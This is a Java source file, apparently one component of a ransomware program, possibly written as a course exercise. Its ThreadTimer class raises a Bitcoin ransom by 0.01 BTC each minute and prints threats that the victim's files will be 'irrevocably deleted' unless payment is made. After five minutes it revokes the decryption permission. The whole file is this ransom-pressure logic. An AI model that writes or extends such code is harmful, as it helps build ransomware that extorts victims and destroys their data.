package S01;

import java.util.concurrent.TimeUnit;

public class ThreadTimer implements Runnable{

    private float price;
    private boolean isActive = false;
    private final int minToWait = 5;
    private final float increasingAmount = 0.01f;
    private int minWaited = 0;
    private boolean allowToDecrypt = true;


    public ThreadTimer(float amount) {
        this.price = amount;
    }

    @Override
    public void run() {
        isActive = true;

        while(minWaited < minToWait){
            if (Thread.interrupted()){
                isActive = false;
                return;
            }

            if (minWaited == 0){
                try{
                    TimeUnit.SECONDS.sleep(60);
                }catch (InterruptedException e){
                    e.printStackTrace();
                    isActive = false;
                    return;
                }
            }else{
                try{
                    newAmount(increasingAmount);
                    System.out.println("Amount to pay increase by 0.01 BTC to " + price + " BTC");
                    if(minWaited == 4){
                        System.out.println("Pay " + price + " BTC immediatly or your files will be irrevocably deleted");
                    }
                    TimeUnit.SECONDS.sleep(60);

                }catch (InterruptedException e){
                    e.printStackTrace();
                    isActive = false;
                    return;
                }
            }
            minWaited++;
        }

        if(!Thread.interrupted()){
            allowToDecrypt = false;
            isActive = false;
        }else{
            System.out.println("5 Minutes are Done: " + minWaited);
        }
    }

    public boolean isAllowToDecrypt() {
        return allowToDecrypt;
    }
    public float newAmount(float amount){
        return this.price = price + amount;
    }

    public float getPrice() {
        return price;
    }
}
